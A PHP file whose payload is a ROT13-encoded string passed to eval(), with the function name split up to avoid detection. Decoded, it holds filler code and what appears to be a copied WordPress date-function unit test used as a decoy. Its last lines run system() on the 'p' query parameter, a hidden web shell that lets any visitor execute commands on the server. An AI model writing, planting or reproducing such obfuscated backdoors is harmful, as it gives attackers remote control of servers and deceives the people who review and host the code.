<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc qngr
 * @tebhc qngrgvzr
 * @tebhc cbfg
 *
 * @pbiref ::gur_qngr
 * @pbiref ::gur_jrrxqnl_qngr
 */
pynff Grfgf_Qngr_GurQngr rkgraqf JC_HavgGrfgPnfr {

	/** @ine neenl $ubbxf_pnyyrq Pbhag bs ubbxf pnyyrq. */
	cebgrpgrq $ubbxf_pnyyrq = neenl(
		'gur_gvzr'               => 0,
		'trg_gur_gvzr'           => 0,
		'gur_zbqvsvrq_gvzr'      => 0,
		'trg_gur_zbqvsvrq_gvzr'  => 0,
		'gur_qngr'               => 0,
		'trg_gur_qngr'           => 0,
		'gur_zbqvsvrq_qngr'      => 0,
		'trg_gur_zbqvsvrq_qngr'  => 0,
		'trg_cbfg_gvzr'          => 0,
		'trg_cbfg_zbqvsvrq_gvzr' => 0,
	);

	choyvp shapgvba grfg_fubhyq_pnyy_ubbxf() {
		nqq_svygre( 'gur_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_gur_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_cbfg_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );

		nqq_svygre( 'gur_zbqvsvrq_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_gur_zbqvsvrq_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_cbfg_zbqvsvrq_gvzr', neenl( $guvf, 'pbhag_ubbx' ) );

		nqq_svygre( 'gur_qngr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_gur_qngr', neenl( $guvf, 'pbhag_ubbx' ) );

		nqq_svygre( 'gur_zbqvsvrq_qngr', neenl( $guvf, 'pbhag_ubbx' ) );
		nqq_svygre( 'trg_gur_zbqvsvrq_qngr', neenl( $guvf, 'pbhag_ubbx' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		tybony $cbfg, $pheeragqnl, $cerivbhfqnl;
		$cbfg        = trg_cbfg( $cbfg_vq );
		$pheeragqnl  = 1;
		$cerivbhfqnl = 0;

		bo_fgneg();

		gur_gvzr();
		trg_gur_gvzr();

		gur_zbqvsvrq_gvzr();
		trg_gur_zbqvsvrq_gvzr();

		gur_qngr();
		trg_gur_qngr();

		gur_zbqvsvrq_qngr();
		trg_gur_zbqvsvrq_qngr();

		trg_cbfg_gvzr();
		trg_cbfg_zbqvsvrq_gvzr();

		bo_raq_pyrna();

		$guvf->nffregFnzr( 1, $guvf->ubbxf_pnyyrq['gur_gvzr'] );
		$guvf->nffregFnzr( 2, $guvf->ubbxf_pnyyrq['trg_gur_gvzr'] );

		$guvf->nffregFnzr( 1, $guvf->ubbxf_pnyyrq['gur_zbqvsvrq_gvzr'] );
		$guvf->nffregFnzr( 2, $guvf->ubbxf_pnyyrq['trg_gur_zbqvsvrq_gvzr'] );

		$guvf->nffregFnzr( 1, $guvf->ubbxf_pnyyrq['gur_qngr'] );
		$guvf->nffregFnzr( 2, $guvf->ubbxf_pnyyrq['trg_gur_qngr'] );

		$guvf->nffregFnzr( 1, $guvf->ubbxf_pnyyrq['gur_zbqvsvrq_qngr'] );
		$guvf->nffregFnzr( 2, $guvf->ubbxf_pnyyrq['trg_gur_zbqvsvrq_qngr'] );

		$guvf->nffregFnzr( 5, $guvf->ubbxf_pnyyrq['trg_cbfg_gvzr'] );
		$guvf->nffregFnzr( 5, $guvf->ubbxf_pnyyrq['trg_cbfg_zbqvsvrq_gvzr'] );
	}

	choyvp shapgvba pbhag_ubbx( $vachg ) {
		++$guvf->ubbxf_pnyyrq[ pheerag_svygre() ];

		erghea $vachg;
	}

	/**
	 * @gvpxrg 33750
	 */
	choyvp shapgvba grfg_gur_qngr() {
		bo_fgneg();
		gur_qngr();
		$npghny = bo_trg_pyrna();
		$guvf->nffregFnzr( '', $npghny );

		$TYBONYF['cbfg'] = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '2015-09-16 08:00:00',
			)
		);

		bo_fgneg();
		$TYBONYF['pheeragqnl']  = '18.09.15';
		$TYBONYF['cerivbhfqnl'] = '17.09.15';
		gur_qngr();
		$guvf->nffregFnzr( 'Frcgrzore 16, 2015', bo_trg_pyrna() );

		bo_fgneg();
		$TYBONYF['pheeragqnl']  = '18.09.15';
		$TYBONYF['cerivbhfqnl'] = '17.09.15';
		gur_qngr( 'L' );
		$guvf->nffregFnzr( '2015', bo_trg_pyrna() );

		bo_fgneg();
		$TYBONYF['pheeragqnl']  = '18.09.15';
		$TYBONYF['cerivbhfqnl'] = '17.09.15';
		gur_qngr( 'L', 'orsber ', ' nsgre' );
		$guvf->nffregFnzr( 'orsber 2015 nsgre', bo_trg_pyrna() );

		bo_fgneg();
		$TYBONYF['pheeragqnl']  = '18.09.15';
		$TYBONYF['cerivbhfqnl'] = '17.09.15';
		gur_qngr( 'L', 'orsber ', ' nsgre', snyfr );
		$guvf->nffregFnzr( '', bo_trg_pyrna() );
	}

	/**
	 * @gvpxrg 47354
	 */
	choyvp shapgvba grfg_gur_jrrxqnl_qngr() {
		bo_fgneg();
		gur_jrrxqnl_qngr();
		$npghny = bo_trg_pyrna();
		$guvf->nffregFnzr( '', $npghny );

		$TYBONYF['cbfg'] = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '2015-09-16 08:00:00',
			)
		);

		bo_fgneg();
		$TYBONYF['pheeragqnl']      = '18.09.15';
		$TYBONYF['cerivbhfjrrxqnl'] = '17.09.15';
		gur_jrrxqnl_qngr();
		$guvf->nffregFnzr( 'Jrqarfqnl', bo_trg_pyrna() );

		bo_fgneg();
		$TYBONYF['pheeragqnl']      = '18.09.15';
		$TYBONYF['cerivbhfjrrxqnl'] = '17.09.15';
		gur_jrrxqnl_qngr( 'orsber ', ' nsgre' );
		$guvf->nffregFnzr( 'orsber Jrqarfqnl nsgre', bo_trg_pyrna() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>